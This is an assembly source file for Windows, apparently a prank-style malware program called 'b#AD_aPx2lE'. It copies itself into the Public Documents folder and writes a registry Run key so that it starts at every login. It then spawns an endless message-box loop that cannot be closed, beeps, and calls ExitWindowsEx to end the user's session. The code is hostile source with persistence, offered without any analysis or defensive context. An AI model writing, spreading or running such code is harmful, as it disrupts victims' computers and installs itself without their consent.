include 'win32ax.inc'
                                     
section '.code' executable
proc very_bad_apple  
  p6:             
  invoke Beep, 311, 600
  ret
endp

proc unclosable_box              
  endless_msg_loop:
  invoke  MessageBox, NULL, 'Oh no, it seems like u ate a BAD APPLE!!!', 'b#AD_aPx2lE', MB_OK
  jmp endless_msg_loop
  ret
endp

proc shutdown_pc                  
  mov eax, 1
  mov ebx, 0
  push eax
  push ebx
  invoke ExitWindowsEx 
  ret
endp

proc write_into_autorun  
  p4:
  invoke  CopyFile, oldFile, newFile, 0
  invoke RegCreateKeyEx, HKEY_CURRENT_USER, AutoKey, NULL, NULL, NULL, KEY_ALL_ACCESS, NULL, hkey, NULL
  invoke lstrlen,szFile
  p3:
  invoke RegSetValueEx,[hkey],ValueName,NULL,REG_SZ,szFile,eax
  invoke RegCloseKey,[hkey]
  ret
endp
        
start: 
  call write_into_autorun
  p1:
  invoke CreateThread, 0, 0, unclosable_box, 0, 0, msg_thread
  call very_bad_apple
  p2:
  call shutdown_pc
.end start   

section '.data' readable writeable
  msg_thread dd ?
  hkey dd ?
  oldFile db 'b#AD_aPx2lE.exe',0
  newFile db 'C:\Users\Public\Documents\b#AD_aPx2lE.exe',0
  szFile db '"C:\Users\Public\Documents\b#AD_aPx2lE.exe" --high', 0
  AutoKey db 'Software\Microsoft\Windows\CurrentVersion\Run',0
  ValueName db 'b#AD_aPx2lE',0  